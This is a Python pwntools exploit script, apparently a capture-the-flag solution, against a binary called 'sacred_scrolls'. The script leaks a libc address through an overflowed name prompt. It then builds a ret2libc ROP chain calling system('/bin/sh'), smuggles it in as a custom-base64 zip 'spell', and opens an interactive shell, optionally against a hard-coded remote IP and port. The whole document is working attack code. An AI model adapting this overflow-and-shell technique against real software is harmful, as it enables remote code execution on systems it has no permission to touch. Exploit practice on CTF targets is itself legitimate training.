from pwn import *
import zipfile
import os
import base64
import string

#b *spell_read+181
gs = '''
b *spell_save+62
continue
'''

def custom_base64_encode(data):
    # Codificar la cadena de bytes a Base64
    b64_encoded = base64.b64encode(data).decode('utf-8')
    
    # Reemplazar '/' por '=' para ajustarse al alfabeto personalizado
    custom_encoded = b64_encoded.replace('/', '=')
    
    return custom_encoded

def generate_zip(content):
    zip_filename = "spell.zip"
    txt_filename = "spell.txt"

    with open(txt_filename, "wb") as f:
        f.write(content)

    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(txt_filename)

    os.remove(txt_filename)

    f = open(zip_filename, "rb")
    content_zip = f.readlines()[0]

    f.close()

    #return b64e(content_zip).encode()
    return custom_base64_encode(content_zip).encode()

elf = context.binary = ELF("./sacred_scrolls")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("83.136.249.153", 55792)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendafter(": ", b"B"*16)

io.recvuntil("BBBBBBBBBBBBBBBB")
leak_libc_sh_address = u64(io.recvline().strip().ljust(8, b"\x00"))

libc.address = leak_libc_sh_address - next(libc.search(b'/bin/sh'))

print(hex(libc.sym.system))

#rop = ROP(libc)
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print(hex(pop_rdi))

io.sendlineafter(">> ", b"1")

payload = b"".join([
    b"\xf0\x9f\x91\x93\xe2\x9a\xa1",
    b"\x41"*33,
    p64(ret),
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym.system)
])

b64_payload = generate_zip(payload)

io.sendlineafter(": ", b64_payload)

io.sendlineafter(">> ", b"2")

io.sendlineafter(">> ", b"3")

io.interactive()
